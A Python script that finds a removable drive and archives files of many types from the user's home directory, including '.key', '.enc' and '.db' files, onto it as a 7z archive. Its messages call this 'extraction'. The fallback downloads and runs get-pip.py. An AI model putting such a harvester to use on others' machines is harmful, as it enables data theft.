import os
import sys
import subprocess
from pathlib import Path
import platform
import getpass

def findDrive(username):
    system = platform.system()
    drives = []
    
    if system == "Windows":
        import ctypes
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            if bitmask & 1:
                drive = f"{letter}:\\"
                drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
                if drive_type == 2:
                    drives.append(drive)
            bitmask >>= 1
    else:
        mountPoints = [f"/media/{username}", f"/run/media/{username}", f"/Volumes/{username}"]
        for mountPoint in mountPoints:
            if os.path.exists(mountPoint):
                for entry in os.listdir(mountPoint):
                    path = os.path.join(mountPoint, entry)
                    if os.path.ismount(path):
                        drives.append(path)

    if not drives:
        print("[WARN] No external removable drive detected.")
        return None

    return drives[0]

def collectMatchingFiles(source, extensions):
    for root, _, files in os.walk(source):
        for file in files:
            if Path(file).suffix.lower() in extensions:
                absPath = os.path.join(root, file)
                relPath = os.path.relpath(absPath, start=source)
                yield (absPath, relPath)

def cliMethod(source, destination, username):
    archiveName = os.path.join(destination, f"{username}Backup.7z")
    print(f"[INFO] Attempting to compress with 7z CLI to {archiveName} ...")

    matchingFiles = list(collectMatchingFiles(source, extensions))
    if not matchingFiles:
        print("[WARN] No files found with specified extensions.")
        return False

    absPaths = [absPath for absPath, _ in matchingFiles]

    try:
        result = subprocess.run(
            ["7z", "a", archiveName] + absPaths + ["-mx=5"],
            capture_output=True, text=True, check=True
        )
        print("[INFO] 7z CLI compression succeeded.")
        return True
    except FileNotFoundError:
        print("[ERROR] 7z executable not found.")
        return False
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] 7z CLI compression failed:\n{e.stderr}")
        return False

def installPy7zr():
    print("[INFO] Attempting to install py7zr...")

    def tryPipInstall():
        commands = [
            [sys.executable, "-m", "pip", "install", "py7zr"],
            ["pip", "install", "py7zr"],
        ]
        for cmd in commands:
            try:
                subprocess.run(cmd, check=True)
                print("[INFO] py7zr installed successfully.")
                return True
            except Exception as e:
                print(f"[ERROR] Failed to install py7zr using {' '.join(cmd)}: {e}")
        return False

    try:
        subprocess.run([sys.executable, "-m", "pip", "--version"], check=True, capture_output=True)
        return tryPipInstall()
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[WARN] pip not found. Attempting to install pip...")

        try:
            import ensurepip
            print("[INFO] Trying to install pip using ensurepip...")
            ensurepip.bootstrap()
            return tryPipInstall()
        except Exception as e:
            print(f"[WARN] ensurepip failed: {e}")

        try:
            import urllib.request
            import tempfile
            import os

            url = "https://bootstrap.pypa.io/get-pip.py"
            with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as tmpFile:
                urllib.request.urlretrieve(url, tmpFile.name)
                subprocess.run([sys.executable, tmpFile.name], check=True)
            print("[INFO] pip installed successfully.")
            return tryPipInstall()
        except Exception as e:
            print(f"[ERROR] Failed to install pip via get-pip.py: {e}")
        finally:
            if 'tmpFile' in locals() and os.path.exists(tmpFile.name):
                os.remove(tmpFile.name)

    return False

def py7zrMethod(source, destination, username):
    try:
        import py7zr
    except ImportError:
        if not installPy7zr():
            print("[ERROR] Failed to install the py7zr package.")
            return False
        import py7zr

    archivePath = os.path.join(destination, f"{username}Backup.7z")
    print(f"[INFO] Attempting to compress files with selected extensions to {archivePath} ...")
    
    matchingFiles = list(collectMatchingFiles(source, extensions))
    if not matchingFiles:
        print("[WARN] No files found with specified extensions.")
        return False

    try:
        with py7zr.SevenZipFile(archivePath, mode='w') as archive:
            for absFilePath, relFilePath in matchingFiles:
                archive.write(absFilePath, arcname=relFilePath)

        print("[INFO] py7zr compression of filtered files succeeded.")
        return True
    except Exception as e:
        print(f"[ERROR] py7zr compression failed: {e}")
        return False

def main():
    username = getpass.getuser()
    homeDirectory = str(Path.home())
    externalDrive = findDrive(username)
    
    if not externalDrive:
        print("[ERROR] No external drive detected. Please insert a drive for extraction.")
        return
    if cliMethod(homeDirectory, externalDrive, username):
        print("[INFO] Extraction complete using cliMethod().")
        return
    if py7zrMethod(homeDirectory, externalDrive, username):
        print("[INFO] Extraction complete using py7zrMethod().")
        return
    print("[ERROR] Failed to extract files.")

if __name__ == "__main__":
    extensions = {".pdf", ".docx", ".txt", ".xls", ".xlsx", ".ppt", ".pptx", ".jpeg", ".jpg", ".png", ".py", ".pyw", ".cpp", ".epub", ".zip", ".7z", ".bat", ".wav", ".mp3", ".mp4", ".md", ".sh", ".exe", ".webp", ".log", ".yaml", ".hex", ".rb", ".c", ".cs", ".html", ".js", ".css", ".lua", ".csv", ".xml", ".rs", ".pyc", ".key", ".java", ".jar", ".ini", ".dll", ".enc", ".db", ".sql", ".o", ".out", ".stl", ".obj"}
    main()
